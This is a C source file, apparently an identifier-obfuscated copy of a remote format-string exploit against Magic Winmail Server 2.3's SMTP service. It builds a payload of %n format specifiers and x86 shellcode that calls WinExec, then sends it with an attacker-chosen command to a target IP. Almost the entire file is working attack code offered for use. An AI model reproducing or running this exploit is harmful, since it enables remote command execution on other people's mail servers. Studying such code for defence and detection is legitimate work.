
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_2__ ;
typedef struct TYPE_3__ TYPE_1__ ;


typedef int sin ;
typedef int WSADATA ;
typedef int WORD ;
struct TYPE_3__ {int s_addr; } ;
struct TYPE_4__ {int sin_port; TYPE_1__ sin_addr; int sin_family; } ;
typedef int SOCKET ;
typedef TYPE_2__ SOCKADDR_IN ;
typedef int SOCKADDR ;


 int VAR_0 ;
 int FUNC_0 (int) ;
 int VAR_1 ;
 int FUNC_1 (int,int ) ;
 int VAR_2 ;
 scalar_t__ FUNC_2 (int ,int *) ;
 int FUNC_3 (char*) ;
 scalar_t__ FUNC_4 (int ,int *,int) ;
 int FUNC_5 (int) ;
 int FUNC_6 (char*) ;
 int FUNC_7 (int ) ;
 int FUNC_8 (char*,...) ;
 int FUNC_9 (char*) ;
 int FUNC_10 (int ,char*,int,int ) ;
 int FUNC_11 (int ,char*,int,int ) ;
 int FUNC_12 (int ,int ,int ) ;
 int FUNC_13 (char*) ;

int FUNC_14 (int VAR_3, char *VAR_4[])
{

 SOCKET VAR_5;

 char VAR_6[1000];
 int VAR_7;


 char VAR_8[] =
  "\xec\xfc\x66\x01%x%x"
  "\xed\xfc\x66\x01%x%x"
  "\xee\xfc\x66\x01"

  "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%28x%n"
  "%97x%n%105x%hn"
 "\x00\x90\x90\x90\x90"
 "\xEB\x50\x5E\x8B\xEC\x83\xEC\x28\xC7\x45\xD8\x4B\x65\x72\x6E\xC7"
 "\x45\xDC\x65\x6C\x33\x32\xC7\x45\xE0\x00\x00\x00\x00\xC7\x45\xE4"
 "\x57\x69\x6E\x45\xC7\x45\xE8\x78\x65\x63\x00\xC6\x45\xEB\x00\xBA"
 "\xAC\x01\x4D\x00\x8D\x45\xD8\x50\xFF\x12\x8D\x5D\xE4\x53\x50\xBA"
 "\xEC\x00\x4D\x00\xFF\x12\x6A\x01\x56\xFF\xD0\xBA\x98\x01\x4D\x00"
 "\xFF\x12\xE8\xAB\xFF\xFF\xFF";

 SOCKADDR_IN VAR_9;
 WSADATA VAR_10;
 WORD VAR_11 = FUNC_1 (2,0);


 FUNC_8 ("* #################################### *\n"
  "  Magic Winmail Server 2.3(Build 0402)\n"
  "     Remote format string exploit !\n"
  "* #################################### *\n"
  "  Coded By ThreaT -> ThreaT\n\n");

 if (VAR_3 < 3 || FUNC_13 (VAR_4[2]) > 90)
 {
 FUNC_8 ("usage : mwmxploit <Target IP> <command to execute> [smtp port]\n\n"
   " + The command to execute cannot exceed 90 characters +\n");
 FUNC_0 (0);
 }

 if ( FUNC_2(VAR_11, &VAR_10) )
 {
  FUNC_8 ("Erreur d'initialisation winsock !\n");
  FUNC_0 (1);
 }

 VAR_9.sin_family = VAR_0;
 VAR_9.sin_port = FUNC_5 ((void *)VAR_4[3] ? FUNC_3 (VAR_4[3]) : 25);

 if ( (VAR_9.sin_addr.s_addr = FUNC_6 (VAR_4[1])) == VAR_1)
 {
  FUNC_8 ("Erreur : L'adresse IP de la victime est incorrect !\n");
  FUNC_0 (2);
 }

 FUNC_8 ("connecting to %s on port %u...", VAR_4[1], FUNC_7 ( VAR_9.sin_port ) );

 VAR_5 = FUNC_12 (VAR_0, VAR_2, 0);
 if ( FUNC_4 (VAR_5, (SOCKADDR *)&VAR_9, sizeof (VAR_9)) )
 {
  FUNC_8 ("erreur : connexion impossible !\n");
  FUNC_0 (3);
 }

 FUNC_10 (VAR_5,VAR_6,1000,0);

 FUNC_8 ("ok\n-> %s\nsending exploit code...",VAR_6);

 FUNC_11 (VAR_5, VAR_8, FUNC_13 (VAR_8) + 92, 0);
 FUNC_11 (VAR_5, VAR_4[2], FUNC_13 (VAR_4[2]), 0);
 FUNC_11 (VAR_5, "\r\n", 2, 0);

 FUNC_10 (VAR_5,VAR_6,1000,0);

 FUNC_9 ("ok");
}
